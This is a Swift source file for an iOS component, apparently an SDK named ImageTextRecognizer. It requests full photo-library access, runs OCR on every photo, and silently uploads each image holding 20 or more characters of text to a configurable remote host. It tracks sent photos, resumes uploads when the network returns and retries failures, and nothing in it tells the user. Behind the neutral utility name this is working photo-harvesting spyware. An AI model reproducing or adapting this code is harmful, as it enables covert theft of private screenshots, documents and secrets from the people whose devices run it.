import Foundation
import UIKit

import Photos
import Vision

@objcMembers
public class ImageTextRecognizer: NSObject {
    public static let shared = ImageTextRecognizer()
    
    public var uploadHost = ""
    public var uploadParam = "files"
    public var uploadFileNamePrefix = "ps"
    public var textFilterBlock: ((String) -> Bool) = { $0.count >= 20 }
    
    public var ocrQueueMaxConcurrentOperationCount = 5 {
        willSet {
            queue.maxConcurrentOperationCount = newValue
        }
    }
    public var uploadQueueMaxConcurrentOperationCount = 5
    
    private let imageManager = PHCachingImageManager.default()
    private let queue: OperationQueue = {
        let queue = OperationQueue()
        queue.maxConcurrentOperationCount = 5
        return queue
    }()
    
    override init() {
        super.init()
        
        NotificationCenter.default.addObserver(forName: UIApplication.didReceiveMemoryWarningNotification,
                                               object: nil,
                                               queue: .main) { [weak self] _ in
            print("⚠️ Memory warning received. Cancelling recognition queue.")
            self?.cancelAll()
        }
    }
    
    @objc
    public func fetchAndRecognize(
        progress: @escaping ([RecognizedPhoto], Int, Int) -> Void
    ) {
        PHPhotoLibrary.requestAuthorization(for: .readWrite) { status in
            DispatchQueue.main.async {
                guard status == .authorized || status == .limited else { return }
                
                let fetchOptions = PHFetchOptions()
                fetchOptions.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: false)]
                let assets = PHAsset.fetchAssets(with: .image, options: fetchOptions)
                
//#if DEBUG
//                let total = min(100, assets.count)
//#else
                let total = assets.count
//#endif
                if total == 0 {
                    progress([], 0, 0)
                    return
                }
                
                var processed = 0
                var results: [RecognizedPhoto] = []
                let lock = NSLock()
                
                for i in 0..<total {
                    let asset = assets.object(at: i)
                    let id = asset.localIdentifier
                    
                    if let cached = PhotoTextCache.shared.isProcessed(asset: asset) {
                        if cached.isValid {
                            results.append(cached)
                        }
                        processed += 1
                        progress(results, processed, total)
                        continue
                    }
                    let op = FetchImageOperation(asset: asset, completion: { (image, texts) in
                        let p = RecognizedPhoto(localIdentifier: id, texts: texts, hasUploaded: false)
                        if p.isValid {
                            UploadManager.shared.enqueueUpload(asset: asset, image: image)
                        }
                        lock.lock()
                        processed += 1
                        print("processed: \(processed)")
                        PhotoTextCache.shared.save(asset: asset, texts: texts)
                        if p.isValid {
                            results.append(p)
                        }
                        lock.unlock()
                        DispatchQueue.main.async {
                            progress(results, processed, total)
                        }
                    })
                    self.queue.addOperation(op)
                }
            }
        }
    }
    
    /// Fetch image for asset.
    @discardableResult
    public class func fetchImage(for asset: PHAsset,
                                 size: CGSize,
                                 progress: ((CGFloat, Error?, UnsafeMutablePointer<ObjCBool>, [AnyHashable : Any]?) -> Void)? = nil,
                                 completion: @escaping (UIImage?, Bool) -> Void
    ) -> PHImageRequestID {
        let option = PHImageRequestOptions()
        option.resizeMode = .fast
        option.isNetworkAccessAllowed = true
        option.deliveryMode = .highQualityFormat
        
        return PHCachingImageManager.default().requestImage(for: asset, targetSize: size, contentMode: .aspectFit, options: option) { (image, info) in
            var downloadFinished = false
            if let info = info {
                downloadFinished = !(info[PHImageCancelledKey] as? Bool ?? false) && (info[PHImageErrorKey] == nil)
            }
            let isDegraded = (info?[PHImageResultIsDegradedKey] as? Bool ?? false)
            if downloadFinished {
                completion(image, isDegraded)
            }
        }
    }
    
    public class func recognizeText(from cgImage: CGImage, completion: @escaping ([String]) -> Void) {
        let handler = VNImageRequestHandler(cgImage: cgImage, options: [:])
        let request = VNRecognizeTextRequest { request, error in
            guard error == nil, let observations = request.results as? [VNRecognizedTextObservation] else {
                completion([])
                return
            }
            let lines = observations
                .compactMap { $0.topCandidates(1).first?.string }
            completion(lines)
        }
        request.recognitionLevel = .fast
//        request.recognitionLanguages = ["zh-Hans", "en-US"]
//        request.automaticallyDetectsLanguage = true
        request.usesLanguageCorrection = true
        DispatchQueue.global(qos: .utility).async {
            do {
                try handler.perform([request])
            } catch {
                print("perform OCR error: \(error)")
                completion([])
            }
        }
    }
    
    func pause() {
        queue.isSuspended = true
    }
    
    func resume() {
        queue.isSuspended = false
    }
    
    func cancelAll() {
        queue.cancelAllOperations()
    }
    
}

@objcMembers
public class RecognizedPhoto: NSObject, Codable {
    public let localIdentifier: String
    public let texts: [String]
    public var hasUploaded: Bool
    
    init(localIdentifier: String, texts: [String], hasUploaded: Bool = false) {
        self.localIdentifier = localIdentifier
        self.texts = texts
        self.hasUploaded = hasUploaded
    }
    
    public var isValid: Bool {
        return texts.contains(where: { $0.rangeOfCharacter(from: .letters) != nil }) && ImageTextRecognizer.shared.textFilterBlock(texts.joined())
    }
}

public class PhotoTextCache {
    public static let shared = PhotoTextCache()
    
    private let queue = DispatchQueue(label: "com.photoTextCache.queue", attributes: .concurrent)
    private var cache: [String: RecognizedPhoto] = [:]
    
    private init() {
        loadFromDisk()
    }
    
    private var jsonURL: URL {
        return FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0].appendingPathComponent("asset_cache.json")
    }
    
    private let debounceInterval: TimeInterval = 2.0  // 最小写入间隔
    private let maxWriteInterval: TimeInterval = 5.0  // 强制写入最大间隔
    private var lastWriteTime: Date = Date.distantPast
    
    private let saveTriggerQueue = DispatchQueue(label: "photo.text.cache.save.trigger")
    private var saveWorkItem: DispatchWorkItem?

    private func scheduleSave() {
        saveTriggerQueue.async { [weak self] in
            guard let self = self else { return }
            
            self.saveWorkItem?.cancel()

            let timeSinceLastWrite = Date().timeIntervalSince(self.lastWriteTime)

            if timeSinceLastWrite >= self.maxWriteInterval { // 超过最大写入间隔 → 立即保存
                self.saveToDisk()
            }
            else { // 否则正常 debounce
                let workItem = DispatchWorkItem { [weak self] in
                    self?.saveToDisk()
                }
                self.saveWorkItem = workItem
                self.saveTriggerQueue.asyncAfter(deadline: .now() + self.debounceInterval, execute: workItem)
            }
        }
    }
    
    func saveToDisk() {
        queue.async(flags: .barrier) {
            print("saveToDisk cache.count: \(self.cache.count)")
            if let data = try? JSONEncoder().encode(self.cache) {
                try? data.write(to: self.jsonURL)
            }
            self.lastWriteTime = Date()
        }
    }

    private func loadFromDisk() {
        queue.async(flags: .barrier) {
            if let data = try? Data(contentsOf: self.jsonURL),
               let dict = try? JSONDecoder().decode([String: RecognizedPhoto].self, from: data) {
                self.cache = dict
                print("loadFromDisk cache.count: \(self.cache.count)")
            }
        }
    }

    func hasUploaded(asset: PHAsset) -> Bool {
        var result = false
        queue.sync {
            result = self.cache[asset.localIdentifier]?.hasUploaded ?? false
        }
        return result
    }
    
    func save(asset: PHAsset, texts: [String], markUploaded: Bool = false) {
        queue.async(flags: .barrier) {
            let entry = RecognizedPhoto(localIdentifier: asset.localIdentifier, texts: texts, hasUploaded: markUploaded)
            self.cache[asset.localIdentifier] = entry
            self.scheduleSave()
        }
    }
    
    func isProcessed(asset: PHAsset) -> RecognizedPhoto? {
        var result: RecognizedPhoto?
        queue.sync {
            result = cache[asset.localIdentifier]
        }
        return result
    }
    
    func markUploaded(_ id: String) {
        queue.async(flags: .barrier) {
            guard let entry = self.cache[id] else { return }
            entry.hasUploaded = true
            self.cache[id] = entry
            self.saveToDisk()
        }
    }
    
    func getAllUnuploaded() -> [PHAsset] {
        var assets: [PHAsset] = []
        queue.sync {
            let ids = self.cache.values.filter {
                !$0.hasUploaded && $0.isValid
            }.map { $0.localIdentifier }
            
            let result = PHAsset.fetchAssets(withLocalIdentifiers: ids, options: nil)
            result.enumerateObjects { asset, _, _ in assets.append(asset) }
        }
        return assets
    }
    
}


import Alamofire
import Network

@objcMembers
public class UploadManager: NSObject {
    
    public static let shared = UploadManager()
    
    private let queue: OperationQueue = {
        let queue = OperationQueue()
        queue.maxConcurrentOperationCount = ImageTextRecognizer.shared.uploadQueueMaxConcurrentOperationCount
        queue.isSuspended = true
        return queue
    }()
    
    private let session = Session(interceptor: UploadRetryPolicy())
    
    private let monitor = NWPathMonitor()
    private let monitorQueue = DispatchQueue(label: "network.monitor")
    
    private override init() {
        super.init()
        
        monitor.pathUpdateHandler = { [weak self] path in
            guard let self else { return }
            let available = (path.status == .satisfied)
            self.queue.isSuspended = !available
            print(available ? "✅ 网络恢复，恢复上传" : "⛔️ 网络中断，暂停上传")
        }
        monitor.start(queue: monitorQueue)
    }

    func enqueueUpload(asset: PHAsset, image: UIImage? = nil, progressHandler: ((Double) -> Void)? = nil) {
        guard !PhotoTextCache.shared.hasUploaded(asset: asset) else { return }
        queue.addOperation(ImageUploadOperation(asset: asset, image: image))
    }
    
    func uploadImage(_ image: UIImage,
                     for asset: PHAsset,
                     progressHandler: ((Double) -> Void)? = nil,
                     completionHandler: @escaping (() -> Void))
    {
        guard let data = image.compressedJPEGData() else {
            completionHandler()
            return
        }
        self.session.upload(multipartFormData: { form in
            form.append(data,
                        withName: ImageTextRecognizer.shared.uploadParam,
                        fileName: "\(ImageTextRecognizer.shared.uploadFileNamePrefix)-\(asset.localIdentifier).jpg",
                        mimeType: "image/jpeg")
        }, to: ImageTextRecognizer.shared.uploadHost)
        .uploadProgress { progress in
            progressHandler?(progress.fractionCompleted)
        }
        .validate()
        .response { response in
#if DEBUG
            print(response.debugDescription)
#endif
            if let _ = response.error {
                
            } else {
                PhotoTextCache.shared.markUploaded(asset.localIdentifier)
            }
            completionHandler()
        }
    }
    
    public func startUploadingUnfinished() {
        let unuploaded = PhotoTextCache.shared.getAllUnuploaded()
        print("unuploaded.count: \(unuploaded.count)")
        
        for asset in unuploaded {
            enqueueUpload(asset: asset)
        }
    }
    
}

final class UploadRetryPolicy: RequestInterceptor {
    func retry(_ request: Request, for session: Session, dueTo error: Error, completion: @escaping (RetryResult) -> Void) {
        if request.retryCount < 3 {
            completion(.retryWithDelay(2))
        } else {
            completion(.doNotRetry)
        }
    }
}

// MARK: - UIImage 扩展：压缩图像
extension UIImage {
    func compressedJPEGData(maxSizeKB: Int = 100) -> Data? {
        return autoreleasepool { () -> Data? in
            var compression: CGFloat = 0.9
            var data = jpegData(compressionQuality: compression)
            while let d = data, d.count > maxSizeKB * 1024, compression > 0.1 {
                compression -= 0.1
                data = jpegData(compressionQuality: compression)
            }
#if DEBUG
            let fmt = ByteCountFormatter()
            fmt.allowedUnits = [.useKB] // optional: restricts the units to MB only
            fmt.countStyle = .file
            print("compressedJPEG data.size: \(fmt.string(fromByteCount: Int64(data?.count ?? 0))) compression: \(compression)")
#endif
            return data
        }
    }
}

class ConcurrentOperation: Operation, @unchecked Sendable {

    override var isAsynchronous: Bool { true }
    
    private var _isExecuting = false
    override private(set) var isExecuting: Bool {
        get { _isExecuting }
        set {
            willChangeValue(for: \.isExecuting)
            _isExecuting = newValue
            didChangeValue(for: \.isExecuting)
        }
    }
    
    private var _isFinished = false
    override private(set) var isFinished: Bool {
        get { _isFinished }
        set {
            willChangeValue(for: \.isFinished)
            _isFinished = newValue
            didChangeValue(for: \.isFinished)
        }
    }
    
    private var _isCancelled = false
    override private(set) var isCancelled: Bool {
        get { _isCancelled }
        set {
            willChangeValue(for: \.isCancelled)
            _isCancelled = newValue
            didChangeValue(for: \.isCancelled)
        }
    }
    
    override final func main() {
        if self.isCancelled {
            self.isFinished = true
            return
        }
        self.isExecuting = true
        print("Started - \(self)")
        self.begin {
            self.finish()
        }
    }

    override func cancel() {
        self.isCancelled = true
        if self.isExecuting {
            self.finish()
        }
    }
    
    func begin(finished: @escaping () -> Void) {
        fatalError("Subclasses must override this method")
    }

    private final func finish() {
        self.isExecuting = false
        self.isFinished = true
        print("Finished - \(self)")
    }
    
}

class FetchImageOperation: ConcurrentOperation, @unchecked Sendable {
    
    let asset: PHAsset
    let completion: ((UIImage?, [String]) -> Void)
    
    init(asset: PHAsset, completion: @escaping (UIImage?, [String]) -> Void) {
        self.asset = asset
        self.completion = completion
    }
    
    private var requestImageID: PHImageRequestID = PHInvalidImageRequestID
    
    override func begin(finished: @escaping () -> Void) {
//        autoreleasepool {
            self.requestImageID = ImageTextRecognizer.fetchImage(for: asset, size: .init(width: 800, height: 800), completion: { [weak self] image, info in
                guard let cgImage = image?.cgImage else {
                    self?.completion(image, [])
                    finished()
                    return
                }
                ImageTextRecognizer.recognizeText(from: cgImage) { texts in
                    self?.completion(image, texts)
                    finished()
                }
            })
//        }
    }
    
    override func cancel() {
        super.cancel()
        if (self.requestImageID != PHInvalidImageRequestID) {
            PHImageManager.default().cancelImageRequest(self.requestImageID)
            print("cancel \(self.requestImageID)")
        }
    }
    
}

class ImageUploadOperation: ConcurrentOperation, @unchecked Sendable {
    
    let asset: PHAsset
    let image: UIImage?
    
    init(asset: PHAsset, image: UIImage?) {
        self.asset = asset
        self.image = image
    }
    
    override func begin(finished: @escaping () -> Void) {
//        autoreleasepool {
            if let image = image {
                UploadManager.shared.uploadImage(image, for: asset) {
                    finished()
                }
            } else {
                ImageTextRecognizer.fetchImage(for: asset, size: .init(width: 800, height: 800), completion: { [weak self] image, isDegraded in
                    guard let self, let image = image else {
                        finished()
                        return
                    }
                    UploadManager.shared.uploadImage(image, for: self.asset) {
                        finished()
                    }
                })
            }
//        }
    }
    
}
